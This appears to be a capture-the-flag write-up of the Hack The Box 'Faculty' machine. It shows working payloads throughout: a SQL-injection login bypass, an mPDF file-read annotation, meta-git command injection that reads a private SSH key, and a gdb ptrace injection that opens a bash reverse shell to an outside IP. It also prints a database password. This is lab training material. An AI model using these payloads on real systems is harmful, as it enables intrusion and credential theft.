---
title: "Hack The Box - Faculty"
date: 2022-11-18T18:51:43+00:00	
categories:
  - hackthebox
tags:
  - redteam
  - pentest
  - hackthebox
---

## Enumeration

### nmap scan
```bash
└─$ sudo nmap -sC -sV -p- 10.129.198.106 -oA nmap/faculty
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-02 19:09 UTC
Nmap scan report for 10.129.198.106
Host is up (0.077s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### port 80 - web server

runing gobuster on the web server we just discovered

```bash
/login.php            (Status: 200) [Size: 4860]
/index.php            (Status: 302) [Size: 12193] [--> login.php]
/header.php           (Status: 200) [Size: 2871]                 
/admin                (Status: 301) [Size: 178] [--> http://faculty.htb/admin/]
/test.php             (Status: 500) [Size: 0]                                  
/topbar.php           (Status: 200) [Size: 1206] 
```

/admin seems interesting, let's dig in to find out more by running gobuster on /admin:
```bash
/home.php             (Status: 200) [Size: 2995]
/login.php            (Status: 200) [Size: 5618]
/events.php           (Status: 500) [Size: 1193]
/index.php            (Status: 302) [Size: 13897] [--> login.php]
/download.php         (Status: 200) [Size: 17]                   
/header.php           (Status: 200) [Size: 2691]                 
/users.php            (Status: 200) [Size: 1593]                 
/assets               (Status: 301) [Size: 178] [--> http://faculty.htb/admin/assets/]
/faculty.php          (Status: 200) [Size: 8532]                                      
/courses.php          (Status: 200) [Size: 9214]                                      
/ajax.php             (Status: 200) [Size: 0]                                         
/schedule.php         (Status: 200) [Size: 5553]                                      
/database             (Status: 301) [Size: 178] [--> http://faculty.htb/admin/database/]
/navbar.php           (Status: 200) [Size: 1116]                                        
/subjects.php         (Status: 200) [Size: 10278]                                       
/topbar.php           (Status: 200) [Size: 1201]
```

looking at the source code of login.php
```html
<script>
	$('#login-form').submit(function(e){
		e.preventDefault()
		$('#login-form button[type="button"]').attr('disabled',true).html('Logging in...');
		if($(this).find('.alert-danger').length > 0 )
			$(this).find('.alert-danger').remove();
		$.ajax({
			url:'admin/ajax.php?action=login_faculty',
			method:'POST',
			data:$(this).serialize(),
			error:err=>{
				console.log(err)
		$('#login-form button[type="button"]').removeAttr('disabled').html('Login');
			},
			success:function(resp){
				if(resp == 1){
					location.href ='index.php';
				}else{
					$('#login-form').prepend('<div class="alert alert-danger">ID Number is incorrect.</div>')
					$('#login-form button[type="button"]').removeAttr('disabled').html('Login');
				}
			}
		})
	})
</script>
```
Here we can see the webrequest is being sent to ajax.php and it is checking the id number in the request

There is a high possibility that a database server is running if there is a login page present in the web server, in this case it is worth it to test for sql injection.

Let's use sqlmap to see if the parameter id_no is vulnerable to sql injection:

`sqlmap -u "http://faculty.htb/admin/ajax.php?action=login_faculty" --data "id_no=0" --dbs `


result:
```bash
sqlmap identified the following injection point(s) with a total of 247 HTTP(s) requests:
---
Parameter: id_no (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id_no=0' AND (SELECT 3500 FROM (SELECT(SLEEP(5)))KGAE) AND 'jTdB'='jTdB
---


available databases [2]:
[*] information_schema
[*] scheduling_db

```

the parameter id_no is injectable, sqlmap return two database names: information_schema, scheduling_db

Checking tables inside scheduling_db
```bash
Database: scheduling_db
[6 tables]
+---------------------+
| class_schedule_info |
| courses             |
| faculty             |
| schedules           |
| subjects            |
| users               |
+---------------------+

```

the table users is interesting, let's dump the content.
```bash
Database: scheduling_db
Table: users
[1 entry]
+----+---------------+------+----------------------------------+----------+
| id | name          | type | password                         | username |
+----+---------------+------+----------------------------------+----------+
| 1  | Administrator | 1    | 1fecbe762af147c1176a0fc2c722a345 | admin    |
+----+---------------+------+----------------------------------+----------+

```

Found the password hash for administrator, but unable to crack it.

Checking faculty table

```bash
+----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+
| id | id_no    | email              | gender | address             | contact        | lastname | firstname | middlename |
+----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+
| 1  | 63033226 | jsmith@faculty.htb | Male   | 151 Blue Lakes Blvd | (646) 559-9192 | Smith    | John      | C          |
| 2  | 85662050 | cblake@faculty.htb | Female | 225 Main St         | (763) 450-0121 | Blake    | Claire    | G          |
| 3  | 30903070 | ejames@faculty.htb | Male   | 142 W Houston St    | (702) 368-3689 | James    | Eric      | P          |
+----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+

```

We now got username and faculty no. login to see if there are any events, found nothing


Looking at the header of the website, it is using School Faculty Scheduling System. Let's see if there are any known vulnerability to this application.

a login bypass exploit

[https://www.exploit-db.com/exploits/48922](https://www.exploit-db.com/exploits/48922)

and a stored xss exploit

[https://www.exploit-db.com/exploits/48921](https://www.exploit-db.com/exploits/48921)

# Exploitation

These two exploits seems very interesting, let's start with the login bypass first.

Using the payload in the PoC -> `username=jyot'+or+1%3D1+%23&password=jyot'+or+1%3D1+%23`, I can bypass authentication.

Then I found a export pdf function in course.php
```php
$('#download-pdf').click(function(e) {
		e.preventDefault()
        console.log("Generating PDF...");
		start_load()
		$.ajax({
			url:'download.php',
			data: "pdf=" + $('#pdf').val(),
		    cache: false,
		    contentType: false,
		    processData: false,
			contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
		    method: 'POST',
		    type: 'POST',
			success:function(resp){
					end_load();
					if (resp.includes("OK")) {
						alert_toast("Data successfully generated",'success')
						setTimeout(function(){
							window.open("../mpdf/tmp/" + resp, '_blank');
						},1500)
					} else {
						alert_toast("Error generating pdf",'danger')
					
					}				
			},
			error: function (err) {
				end_load();
				alert_toast("Error generating pdf",'danger')
			}
		})
    });
```

Exporting pdf and check the pdf content:

![photo1](/assets/images/Pasted_image_20220703165143.png)

decided to add new course and add some html tag to it to see if it is working

![photo2](/assets/images/Pasted_image_20220703165429.png)

it is working 

![photo3](/assets/images/Pasted_image_20220703165528.png)

according to the returningURL target could be running php library mpdf:

http://faculty.htb/mpdf/tmp/OK3J1gnALaKI2BHGQker6Wo7jy.pdf

intercept request when download

![photo4](/assets/images/Pasted_image_20220704191400.png)


base64 decode with cyberchef, this seems to be the content of the pdf. Maybe we can modify it and create our own pdf.

```bash
%253Ch1%253E%253Ca%2Bname%253D%2522top%2522%253E%253C%252Fa%253Efaculty.htb%253C%252Fh1%253E%253Ch2%253ECourses%253C%252Fh2%253E%253Ctable%253E%2509%253Cthead%253E%2509%2509%253Ctr%253E%2509%2509%2509%253Cth%2Bclass%253D%2522text-center%2522%253E%2523%253C%252Fth%253E%2509%2509%2509%253Cth%2Bclass%253D%2522text-center%2522%253ECourse%253C%252Fth%253E%2509%2509%2509%253Cth%2Bclass%253D%2522text-center%2522%253EDescription%253C%252Fth%253E%2509%2509%2509%253C%252Ftr%253E%253C%252Fthead%253E%253Ctbody%253E%253Ctr%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E1%253C%252Ftd%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E%253Cb%253EInformation%2BTechnology%253C%252Fb%253E%253C%252Ftd%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E%253Csmall%253E%253Cb%253EIT%253C%252Fb%253E%253C%252Fsmall%253E%253C%252Ftd%253E%253C%252Ftr%253E%253Ctr%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E2%253C%252Ftd%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E%253Cb%253EBSCS%253C%252Fb%253E%253C%252Ftd%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E%253Csmall%253E%253Cb%253EBachelor%2Bof%2BScience%2Bin%2BComputer%2BScience%253C%252Fb%253E%253C%252Fsmall%253E%253C%252Ftd%253E%253C%252Ftr%253E%253Ctr%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E3%253C%252Ftd%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E%253Cb%253EBSIS%253C%252Fb%253E%253C%252Ftd%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E%253Csmall%253E%253Cb%253EBachelor%2Bof%2BScience%2Bin%2BInformation%2BSystems%253C%252Fb%253E%253C%252Fsmall%253E%253C%252Ftd%253E%253C%252Ftr%253E%253Ctr%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E4%253C%252Ftd%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E%253Cb%253EBSED%253C%252Fb%253E%253C%252Ftd%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E%253Csmall%253E%253Cb%253EBachelor%2Bin%2BSecondary%2BEducation%253C%252Fb%253E%253C%252Fsmall%253E%253C%252Ftd%253E%253C%252Ftr%253E%253Ctr%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E5%253C%252Ftd%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E%253Cb%253EMath%253C%252Fb%253E%253C%252Ftd%253E%253Ctd%2Bclass%253D%2522text-center%2522%253E%253Csmall%253E%253Cb%253E%253Cannotation%2Bfile%253D%2522%252Fetc%252Fpasswd%2522%2Bcontent%253D%2522%252Fetc%252Fpasswd%2522%2Bicon%253D%2522Graph%2522%2Btitle%253D%2522Attached%2BFile%253A%2B%252Fetc%252Fpasswd%2522%2Bpos-x%253D%2522195%2522%2B%252F%253E%253C%252Fb%253E%253C%252Fsmall%253E%253C%252Ftd%253E%253C%252Ftr%253E%253C%252Ftboby%253E%253C%252Ftable%253E
```

The encoding seems unusal than regular urlencoding, after googling I found out this is double-encoded

![photo5](/assets/images/Pasted_image_20220704192429.png)


found a blog talking about the LFI vulnerability in mPDF

[https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f](https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f)


to make it work, we have to encode the payload and send it to download.php

`<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />`

cyberchef can help

![photo6](/assets/images/Pasted_image_20220704194532.png)

Time to execute, here I will use curl to send the payload to the server.

```bash
# sending pdf content to download.php
┌──(kali㉿kali)-[~/HTB-Boxes/faculty]
└─$ curl -X POST "http://faculty.htb/admin/download.php" --data "pdf=JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9hZG1pbl9jbGFzcy5waHAlMjUyMiUyNTIwY29udGVudD0lMjUyMi92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vYWRtaW5fY2xhc3MucGhwJTI1MjIlMjUyMGljb249JTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZT0lMjUyMkF0dGFjaGVkJTI1MjBGaWxlOiUyNTIwL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9hZG1pbl9jbGFzcy5waHAlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF"

OKBbrAomnM3EHzhUVXcsNPS4Fp.pdf     
# download pdf
┌──(kali㉿kali)-[~/HTB-Boxes/faculty]
└─$ wget http://faculty.htb/mpdf/tmp/OKBbrAomnM3EHzhUVXcsNPS4Fp.pdf
--2022-07-04 21:55:42--  http://faculty.htb/mpdf/tmp/OKBbrAomnM3EHzhUVXcsNPS4Fp.pdf
Resolving faculty.htb (faculty.htb)... 10.129.166.189
Connecting to faculty.htb (faculty.htb)|10.129.166.189|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4400 (4.3K) [application/pdf]
Saving to: ‘OKBbrAomnM3EHzhUVXcsNPS4Fp.pdf’

OKBbrAomnM3EHzhUVXcsNPS4Fp.pd 100%[==============================================>]   4.30K  --.-KB/s    in 0s      

2022-07-04 21:55:42 (791 MB/s) - ‘OKBbrAomnM3EHzhUVXcsNPS4Fp.pdf’ saved [4400/4400]

# open pdf file
┌──(kali㉿kali)-[~/HTB-Boxes/faculty]
└─$ open OKBbrAomnM3EHzhUVXcsNPS4Fp.pdf
```

after downloading the file we can open it with a pdf viewer and open the attachment

!!!(do not open in browser since we need to open attachment)!!!


We are able to read /etc/passwd
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```
got three user: root, gbyolo and developer

Next thing I try to do is reading ssh private key file, but I can't find any of them. Then I move on to try to analysis the source code of the website.

First off, I will look at ajax.php
```php
<?php
ob_start();
$action = $_GET['action'];
include 'admin_class.php';
$crud = new Action();
if($action == 'login'){
	$login = $crud->login();
	if($login)
		echo $login;
}
if($action == 'login_faculty'){
	$login_faculty = $crud->login_faculty();
	if($login_faculty)
		echo $login_faculty;
}
if($action == 'login2'){
	$login = $crud->login2();
	if($login)
		echo $login;
}
```

inside admin_class.php, it is importing creds from db_connect.php
```php
<?php
session_start();
ini_set('display_errors', 1);
Class Action {
	private $db;

	public function __construct() {
		ob_start();
   	include 'db_connect.php';
    
    $this->db = $conn;
	}
	function __destruct() {
	    $this->db->close();
	    ob_end_flush();
	}

	function login(){
		
```

inside db_connect.php
```bash
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

found cred ==> sched:Co.met06aci.dly53ro.per

we can use this password to login as the user gbyolo!

# Lateral movement

Listing user sudo privilege
```bash
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

mailbox content


```bash
gbyolo@faculty:/var/mail$ cat gbyolo 
From developer@faculty.htb  Tue Nov 10 15:03:02 2020
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
	id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20201110140302.0399E26125A@faculty.htb>
Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
```

Looking for meta-git vulnerability:

[https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)

according to the sudoer file, we can run meta-git as user developer, let's try to use this method to create a file:
```bash
gbyolo@faculty:/dev/shm$ sudo -u developer /usr/local/bin/meta-git clone 'sss||touch HACKED'
meta git cloning into 'sss||touch HACKED' at sss||touch HACKED

sss||touch HACKED:
fatal: repository 'sss' does not exist
sss||touch HACKED ✓
(node:70766) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/dev/shm/sss||touch HACKED'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:70766) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)
(node:70766) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
gbyolo@faculty:/dev/shm$ ls -al
total 0
drwxrwxrwt  3 root      root       100 Jul  5 08:06 .
drwxr-xr-x 18 root      root      3960 Jul  3 21:01 ..
-rw-rw-r--  1 developer developer    0 Jul  5 08:06 HACKED
drwx------  4 root      root        80 Jul  3 21:01 multipath
-rw-rw-r--  1 developer developer    0 Jul  5 08:06 sss

```

the method is working, let's read the ssh private key of developer:

`sudo -u developer /usr/local/bin/meta-git clone 'sss||cat /home/developer/.ssh/id_rsa'`

We can now login as the user **developer**!

# Privilege Escalation

user group seems interesting:

`uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)`

## Unleashing linpeas.sh

Listing capabilities
```bash
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gdb = cap_sys_ptrace+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

the capability 'cap_sys_ptrace' in gdb seems useful

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace)

let's try to inject command into a python process
```bash
developer@faculty:~$ ps aux | grep root | grep python
root         735  0.0  0.9  26896 18156 ?        Ss   Jul04   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
```

```bash
# attach process
gdb -p 732
# inject command
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/10.10.14.62/9002 0>&1'")

```

what is ptrace?

ptrace is **a system call found in Unix and several Unix-like operating systems**. By using ptrace (the name is an abbreviation of "process trace") one process can control another, enabling the controller to inspect and manipulate the internal state of its target.

got root!

![photo7](/assets/images/Pasted_image_20220706011117.png)